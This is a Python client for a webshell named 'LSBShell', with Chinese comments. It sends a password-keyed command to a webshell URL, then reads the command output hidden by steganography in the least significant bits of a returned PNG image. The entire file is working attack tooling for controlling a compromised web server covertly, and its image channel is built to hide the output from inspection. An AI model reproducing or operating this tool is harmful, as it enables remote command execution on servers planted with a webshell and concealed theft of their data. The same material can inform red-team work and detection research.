# -*- coding:UTF-8 -*-
import base64
import logging
import argparse
import requests
import urllib.parse
from PIL import Image


def mod(x, y):
    return x % y

# le为所要提取的信息的长度，str1为加密载体图片的路径
def getReuslt(le,str1):
    b = ""
    res = ""
    im = Image.open(str1).convert('RGB')
    lenth = le * 8
    width = im.size[0]
    height = im.size[1]
    count = 0
    for h in range(0, height):
        for w in range(0, width):
            # 获得(w,h)点像素的值
            pixel = im.getpixel((w, h))
            # 此处余3，依次从R、G、B三个颜色通道获得最低位的隐藏信息
            if count % 3 == 0:
                count += 1
                b = b + str((mod(pixel[0], 2)))
                if count == lenth:
                    break
            if count % 3 == 1:
                count += 1
                b = b + str((mod(pixel[1], 2)))
                if count == lenth:
                    break
            if count % 3 == 2:
                count += 1
                b = b + str((mod(pixel[2], 2)))
                if count == lenth:
                    break
        if count == lenth:
            break
    for i in range(0, len(b), 8):
        # 以每8位为一组二进制，转换为十进制
        stra = int(b[i:i + 8],2)
        # 将转换后的十进制数视为ascii码，再转换为字符串写入到文件中
        res += chr(stra)
        stra = ""
    return urllib.parse.unquote(res)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description = 'LSBShell - Webshell Of Least Significant Bit')
    parser.add_argument('-u', '--url', help = 'LSBShell Url')
    parser.add_argument('-p', '--password', help = 'LSBShell Password')
    parser.add_argument('-c', '--command',help = 'Command')
    parser.add_argument('-e', '--encodingtype', help = 'Encoding type default:utf-8',default="utf-8")
    args = parser.parse_args()
    proxies = { "http": "http://127.0.0.1:8080/", "https": "https://127.0.0.1:8080/"} 
    if args.url and args.password and args.command:
        try:
            data = {
                args.password:args.command
            }
            print("\033[1;36m Sending command to LSBShell...\033[0m")
            png = requests.post(args.url,data=data,proxies=proxies)
            #png = requests.post(args.url,data=data)
            print("\033[1;36m Sending command complete...\033[0m")
            with open('res.png','wb') as f:
                f.write(png.content)
            le = int(png.headers['Set-Length'])
            f.close()
            print("\033[1;36m Get Return result..\033[0m")
            new = "res.png"
            # # 信息提取出后所存放的文件
            picres = getReuslt(le,new)
            #print(picres)
            cmdres = str(base64.b64decode(picres.encode("utf-8")),args.encodingtype)
            print("\033[1;36m ====================================== \033[0m")
            print("\033[1;36m "+ cmdres +"\033[0m")
        except base64.binascii.Error as err:
            print("\033[1;31m The encodingtype is incorrect or the returned content is incomplete ! \033[0m")
        except Exception as err:
            print("\033[1;31m "+ str(err) +" \033[0m")

    else:
        print("\033[1;31m Please -h ! \033[0m")